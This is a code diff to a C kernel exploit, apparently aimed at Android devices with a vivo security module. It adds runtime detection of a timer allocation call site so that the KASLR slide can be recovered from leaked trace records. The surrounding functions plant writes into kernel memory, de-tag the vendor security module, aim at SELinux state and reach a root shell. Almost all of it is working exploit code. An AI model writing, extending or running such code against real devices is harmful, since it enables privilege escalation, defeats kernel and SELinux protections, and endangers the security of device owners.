@@ -90,6 +90,15 @@
  */
 #include "profiles.h"
 static int g_timer_site_kind = 0;
+/* Runtime-detected do_timer_create call site.  The low 21 bits are a
+ * per-build constant (the KASLR slide is 2 MiB aligned and does not touch
+ * them) and every k_itimer allocation record carries bytes_req==TIMER_ALLOC,
+ * so the trigger does not depend on a profile match.  When the detected
+ * site differs from the profile, the static addresses (slide, TP, SELinux)
+ * are left unused and only the runtime-only shell path can run. */
+static unsigned long long g_timer_site_low = TIMER_SITE_LOW21;
+static int g_static_ok = 1;
+static int detect_timer_site(const unsigned char *b, size_t n, int pid);
 
 /* vivo vr.ko: __tracepoint_sys_exit, funcs at +0x40 on this ABI.  Layout
  * confirmed two ways: BTF (name@0x00 ... funcs@0x40) and the Image itself
@@ -254,6 +263,63 @@ static int is_kernel_ptr(unsigned long long v)
  *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
  *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
  */
+/* Identify this build's do_timer_create allocation call site from the
+ * k_itimer records themselves (bytes_req/alloc == TIMER_ALLOC).  Keeps the
+ * trigger working on builds whose static addresses we do not have. */
+static int detect_timer_site(const unsigned char *b, size_t n, int pid)
+{
+    unsigned long long low[8] = {0}, cnt[8] = {0};
+    int hc = 0, best = 0, k, f;
+
+    for (size_t i = 8; i + 32 <= n; i += 4)
+    {
+        unsigned long long site, req, alloc, l;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        req = u64(b, i + 16);
+        alloc = u64(b, i + 24);
+        if (req != TIMER_ALLOC && alloc != TIMER_ALLOC)
+            continue;
+        site = u64(b, i);
+        if (!is_kernel_ptr(site))
+            continue;
+        l = site & 0x1fffffULL;
+        f = 0;
+        for (k = 0; k < hc; k++)
+            if (low[k] == l)
+            {
+                cnt[k]++;
+                f = 1;
+                break;
+            }
+        if (!f && hc < 8)
+        {
+            low[hc] = l;
+            cnt[hc] = 1;
+            hc++;
+        }
+    }
+    if (!hc)
+        return 0;
+    for (k = 1; k < hc; k++)
+        if (cnt[k] > cnt[best])
+            best = k;
+    g_timer_site_low = low[best];
+    if (g_timer_site_low != TIMER_SITE_LOW21 &&
+        g_timer_site_low != TIMER_SITE_LOW21_2)
+    {
+        g_static_ok = 0;
+        logf("[site] timer call site low21=%#llx differs from profile (%#llx);"
+             " static addresses stay unused\n",
+             g_timer_site_low, (unsigned long long)TIMER_SITE_LOW21);
+    }
+    else
+        logf("[site] timer call site low21=%#llx matches profile\n",
+             g_timer_site_low);
+    return 1;
+}
+
 static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                              unsigned long long *out, int max,
                              unsigned long long *first_site)
@@ -269,7 +335,7 @@ static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
         site = u64(b, i);
         {
             unsigned long long low = site & 0x1fffffULL;
-            if (low != TIMER_SITE_LOW21 && low != TIMER_SITE_LOW21_2)
+            if (low != g_timer_site_low)
                 continue;
             if (!cnt && !first_site) g_timer_site_kind = (low == TIMER_SITE_LOW21) ? 0 : 1;
         }
@@ -640,7 +706,7 @@ static unsigned long long calibrate_base(unsigned char *raw)
     unsigned long long hist[64] = {0}, hcnt[64] = {0};
     unsigned long long recent[64];
     unsigned long long ptrs[512];
-    int hc = 0, rn = 0, made = 0, me = getpid();
+    int hc = 0, rn = 0, made = 0, me = getpid(), c = 0;
     long n;
 
     trace_start();
@@ -662,7 +728,8 @@ static unsigned long long calibrate_base(unsigned char *raw)
         return 0;
 
     {
-        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
+        (void)detect_timer_site(raw, (size_t)n, me);
+        c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
 
         for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
         {
@@ -710,7 +777,8 @@ static unsigned long long calibrate_base(unsigned char *raw)
                 bestc = hcnt[k];
                 best = hist[k];
             }
-        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
+        logf("[base] made=%d c=%d rn=%d best=%#llx count=%llu\n", made,
+             c, rn, best, bestc);
         return bestc >= 4 ? best : 0;
     }
 }
@@ -1628,12 +1696,16 @@ static void run_plant(unsigned long long target, int tag, int mode,
             slab_own++;
     pfn = (V - g_base) >> 12;
     slab_pfn = pfn & ~1ULL;
-    g_slide = site0 - (g_timer_site_kind ? STATIC_TIMER_SITE_2 : STATIC_TIMER_SITE);
+    if (g_static_ok)
+        g_slide = site0 -
+                  (g_timer_site_kind ? STATIC_TIMER_SITE_2 : STATIC_TIMER_SITE);
+    else
+        g_slide = 0;
 
     /* KASLR text slides are 2 MiB aligned and well under 16 GiB.  An
      * implausible value means the captured call site belongs to another
      * build (low21 collision); stop before any write. */
-    if ((g_slide & 0x1fffffULL) || g_slide > 0x400000000ULL)
+    if (g_static_ok && ((g_slide & 0x1fffffULL) || g_slide > 0x400000000ULL))
     {
         logf("[-] plant%d implausible slide %#llx (site=%#llx); refusing\n",
              tag, g_slide, site0);
@@ -2428,18 +2500,35 @@ int main(int argc, char **argv)
         }
         if (!verified)
             park_forever("no verified plant");
-        if (g_child_task)
+        if (g_child_task && g_static_ok)
         {
             if (defeat_vr(g_child_task, raw))
                 park_forever("shell vr de-tag failed");
         }
         else
-            logf("[-] shell vr de-tag skipped: child task not leaked\n");
+            logf("[-] shell vr de-tag skipped: %s\n",
+                 g_child_task ? "no profile match for the tp address"
+                              : "child task not leaked");
     }
     else
     {
         struct plant_res fc;
 
+        if (!g_static_ok)
+        {
+            /* The fake endgame needs selinux_state / init_* / TP absolute
+             * addresses; without a profile match those cannot be derived,
+             * and a wrong slide would aim every write at this build's
+             * unknown layout. */
+            logf("[-] fake path needs the profile's static addresses; this "
+                 "build's timer site differs -- run without a mode for the "
+                 "shell path\n");
+            close(go_fd);
+            close(st_fd);
+            kill(C, SIGKILL);
+            waitpid(C, NULL, 0);
+            return 1;
+        }
         if (!g_child_task)
             park_forever("child task not leaked");
 
